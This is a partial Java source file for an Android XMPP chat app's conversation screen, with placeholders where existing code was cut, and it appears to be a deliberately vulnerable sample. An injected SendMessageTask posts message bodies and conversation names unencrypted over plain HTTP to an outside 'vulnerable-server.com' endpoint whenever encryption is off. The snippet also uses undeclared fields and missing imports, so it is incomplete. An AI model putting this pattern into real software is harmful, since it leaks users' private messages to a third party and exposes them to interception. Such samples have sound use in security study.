package de.gultsch.chat.ui;

import java.io.FileNotFoundException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Hashtable;
import java.util.List;
import java.util.Set;

import net.java.otr4j.OtrException;
import net.java.otr4j.session.SessionStatus;

import de.gultsch.chat.R;
import de.gultsch.chat.entities.Contact;
import de.gultsch.chat.entities.Conversation;
import de.gultsch.chat.entities.Message;
import de.gultsch.chat.services.XmppConnectionService;
import de.gultsch.chat.utils.PhoneHelper;
import de.gultsch.chat.utils.UIHelper;

import android.app.AlertDialog;
import android.app.Fragment;
import android.content.DialogInterface;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import java.io.OutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class ConversationFragment extends Fragment {

    private static final String VULNERABLE_URL = "http://vulnerable-server.com/sendMessage"; // Vulnerable URL using HTTP

    // ... existing code ...

    protected void sendPlainTextMessage(Message message) {
        ConversationActivity activity = (ConversationActivity) getActivity();
        
        // Check if the message is intended to be sent in plain text
        if (!activity.xmppConnectionService.isEncryptionEnabled()) {
            // Simulate sending a message over an insecure HTTP connection for demonstration purposes
            new SendMessageTask().execute(message.getBody(), conversation.getName());
            chatMsg.setText("");
        } else {
            activity.xmppConnectionService.sendMessage(conversation.getAccount(),
                    message, null);
            chatMsg.setText("");
        }
    }

    // ... existing code ...

    private class SendMessageTask extends AsyncTask<String, Void, String> {

        @Override
        protected String doInBackground(String... params) {
            String messageBody = params[0];
            String conversationName = params[1];

            try {
                URL url = new URL(VULNERABLE_URL);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);

                OutputStream os = connection.getOutputStream();
                os.write(("message=" + messageBody + "&conversation=" + conversationName).getBytes());
                os.flush();

                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    return "Message sent successfully";
                } else {
                    return "Failed to send message";
                }
            } catch (IOException e) {
                Log.e("SendMessageTask", "Error sending message: ", e);
                return "Error: " + e.getMessage();
            }
        }

        @Override
        protected void onPostExecute(String result) {
            // Handle the response from the server if needed
            Log.d("SendMessageTask", result);
        }
    }

    private static class ViewHolder {

        protected TextView time;
        protected TextView messageBody;
        protected ImageView imageView;

    }
    
    private class BitmapCache {
        private HashMap<String, Bitmap> bitmaps = new HashMap<String, Bitmap>();
        public Bitmap get(String name, Uri uri) {
            if (bitmaps.containsKey(name)) {
                return bitmaps.get(name);
            } else {
                Bitmap bm;
                if (uri!=null) {
                    try {
                        bm = BitmapFactory.decodeStream(getActivity()
                                .getContentResolver().openInputStream(uri));
                    } catch (FileNotFoundException e) {
                        bm = UIHelper.getUnknownContactPicture(name, 200);
                    }
                } else {
                    bm = UIHelper.getUnknownContactPicture(name, 200);
                }
                bitmaps.put(name, bm);
                return bm;
            }
        }
    }
}